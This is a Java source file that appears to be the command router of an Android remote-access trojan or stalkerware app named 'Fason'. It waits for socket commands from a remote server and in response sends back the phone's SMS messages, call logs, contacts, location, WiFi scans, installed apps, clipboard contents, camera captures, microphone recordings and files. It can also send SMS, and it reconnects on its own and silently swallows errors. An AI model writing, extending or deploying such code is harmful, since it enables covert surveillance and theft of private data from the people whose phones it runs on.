package com.fason.app.core.network;

import android.Manifest;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;

import com.fason.app.core.FasonApp;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.features.apps.AppList;
import com.fason.app.features.apps.FasonManager;
import com.fason.app.features.calls.CallsManager;
import com.fason.app.features.camera.CameraManager;
import com.fason.app.features.clipboard.ClipboardMonitor;
import com.fason.app.features.contacts.ContactsManager;
import com.fason.app.features.info.InfoManager;
import com.fason.app.features.location.LocManager;
import com.fason.app.features.mic.MicManager;
import com.fason.app.features.sms.SMSManager;
import com.fason.app.features.storage.FileManager;
import com.fason.app.features.wifi.WifiScanner;
import com.fason.app.notifications.NotificationRelayService;
import com.fason.app.service.MainService;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import io.socket.client.Socket;

// Routes socket commands to feature handlers
public final class SocketCommandRouter {

    private static FileManager fileMgr;
    private static CameraManager camMgr;
    private static final ExecutorService EXEC = Executors.newFixedThreadPool(4);
    private static final Handler handler = new Handler(Looper.getMainLooper());
    private static boolean initialized = false;

    private SocketCommandRouter() {}

    // Initialize command router
    public static synchronized void initialize() {
        if (initialized) return;

        // Lazy init managers
        if (fileMgr == null) fileMgr = new FileManager();
        if (camMgr == null) camMgr = new CameraManager(FasonApp.getContext());

        Socket socket = SocketClient.getInstance().getSocket();
        if (socket == null) {
            handler.postDelayed(SocketCommandRouter::initialize, 5000);
            return;
        }

        socket.off();

        // Keep-alive ping
        socket.on("ping", args -> {
            Socket s = SocketClient.getInstance().getSocket();
            if (s != null) s.emit("pong");
        });

        // Main command handler
        socket.on("order", args -> handleOrder(args));

        // Reconnect on disconnect
        socket.on(Socket.EVENT_DISCONNECT, args -> {
            handler.postDelayed(() -> {
                Socket s = SocketClient.getInstance().getSocket();
                if (s != null && !s.connected()) s.connect();
            }, 5000);
        });

        socket.connect();
        initialized = true;
    }

    // Route command to handler
    private static void handleOrder(Object[] args) {
        try {
            if (args.length == 0 || !(args[0] instanceof JSONObject)) return;
            JSONObject data = (JSONObject) args[0];
            String type = data.optString("type", "");
            Socket socket = SocketClient.getInstance().getSocket();

            switch (type) {
                case "0xFI": handleFile(data); break;
                case "0xSM": handleSms(data, socket); break;
                case "0xCL": EXEC.execute(() -> emit(socket, "0xCL", CallsManager.getLogs())); break;
                case "0xCO": EXEC.execute(() -> emit(socket, "0xCO", ContactsManager.getContacts())); break;
                case "0xMI": handleMic(data); break;
                case "0xLO": handleLocation(socket); break;
                case "0xWI": handleWifi(socket); break;
                case "0xPM": EXEC.execute(() -> emit(socket, "0xPM", PermissionManager.getGranted())); break;
                case "0xIN": EXEC.execute(() -> emit(socket, "0xIN", AppList.get(data.optBoolean("sys", true)))); break;
                case "0xGP": checkPerm(socket, data.optString("perm", "")); break;
                case "0xCA": handleCamera(data, socket); break;
                case "0xCB": handleClipboard(data); break;
                case "0xNO": handleNotif(data, socket); break;
                case "0xFM": handleFason(data, socket); break;
                case "0xIF": EXEC.execute(() -> emit(socket, "0xIF", InfoManager.get())); break;
            }
        } catch (Exception ignored) {}
    }

    // File operations
    private static void handleFile(JSONObject data) {
        String action = data.optString("action");
        String path = data.optString("path", "");
        try {
            if ("ls".equals(action)) {
                JSONObject r = new JSONObject();
                r.put("type", "list");
                r.put("list", fileMgr.walk(path));
                r.put("path", path);
                SocketClient.getInstance().getSocket().emit("0xFI", r);
            } else if ("dl".equals(action)) {
                fileMgr.downloadFile(path);
            }
        } catch (Exception ignored) {}
    }

    // SMS operations
    private static void handleSms(JSONObject data, Socket socket) {
        String action = data.optString("action");
        if ("ls".equals(action)) {
            EXEC.execute(() -> emit(socket, "0xSM", SMSManager.get()));
        } else if ("sendSMS".equals(action)) {
            EXEC.execute(() -> emit(socket, "0xSM", SMSManager.send(
                data.optString("to"), data.optString("sms"))));
        }
    }

    // Mic recording
    private static void handleMic(JSONObject data) {
        int sec = data.optInt("sec", 0);

        // Update service type for Android 14+
        MainService svc = MainService.getInstance();
        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            svc.updateType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        }

        MicManager.start(sec);
    }

    // Location
    private static void handleLocation(Socket socket) {
        EXEC.execute(() -> {
            try {
                MainService svc = MainService.getInstance();
                LocManager loc = svc != null ? svc.getLocManager() : new LocManager(FasonApp.getContext());

                loc.requestSingle();
                Thread.sleep(3000);

                if (loc.canGetLocation()) {
                    emit(socket, "0xLO", loc.getData());
                } else {
                    JSONObject err = new JSONObject();
                    err.put("enabled", false);
                    err.put("error", "Location unavailable");
                    emit(socket, "0xLO", err);
                }
            } catch (Exception ignored) {}
        });
    }

    // WiFi scan
    private static void handleWifi(Socket socket) {
        EXEC.execute(() -> emit(socket, "0xWI", WifiScanner.scan(FasonApp.getContext())));
    }

    // Camera operations
    private static void handleCamera(JSONObject data, Socket socket) {
        String action = data.optString("action");
        if ("list".equals(action)) {
            JSONObject cams = camMgr.getCameraList();
            if (cams == null) {
                try {
                    cams = new JSONObject();
                    cams.put("camList", true);
                    cams.put("list", new JSONArray());
                } catch (Exception ignored) {}
            }
            socket.emit("0xCA", cams);
        } else if ("capture".equals(action)) {
            camMgr.capture(data.optInt("id", 0));
        }
    }

    // Clipboard operations
    private static void handleClipboard(JSONObject data) {
        ClipboardMonitor m = ClipboardMonitor.getInstance(FasonApp.getContext());
        String action = data.optString("action", "fetch");
        if ("start".equals(action)) {
            m.start();
            EXEC.execute(m::emit);
        } else if ("stop".equals(action)) {
            m.stop();
        } else {
            EXEC.execute(m::emit);
        }
    }

    // Notification operations
    private static void handleNotif(JSONObject data, Socket socket) {
        String action = data.optString("action", "status");
        if ("status".equals(action)) {
            EXEC.execute(() -> {
                try {
                    JSONObject s = new JSONObject();
                    s.put("enabled", NotificationRelayService.isEnabled(FasonApp.getContext()));
                    s.put("connected", NotificationRelayService.getInstance() != null &&
                        NotificationRelayService.getInstance().isReady());
                    socket.emit("0xNO", s);
                } catch (Exception ignored) {}
            });
        } else if ("request".equals(action)) {
            NotificationRelayService.requestPermission(FasonApp.getContext());
        }
    }

    // Check permission status
    private static void checkPerm(Socket socket, String perm) {
        EXEC.execute(() -> {
            try {
                JSONObject r = new JSONObject();
                r.put("permission", perm);
                r.put("allowed", PermissionManager.canIUse(perm));
                socket.emit("0xGP", r);
            } catch (Exception ignored) {}
        });
    }

    // Fason manager operations
    private static void handleFason(JSONObject data, Socket socket) {
        EXEC.execute(() -> {
            try {
                String action = data.optString("action", "status");
                emit(socket, "0xFM", FasonManager.handle(action));
            } catch (Exception ignored) {}
        });
    }

    // Emit helper
    private static void emit(Socket socket, String event, Object data) {
        if (socket != null) socket.emit(event, data);
    }

    // Reset router
    public static void reset() {
        initialized = false;
    }
}
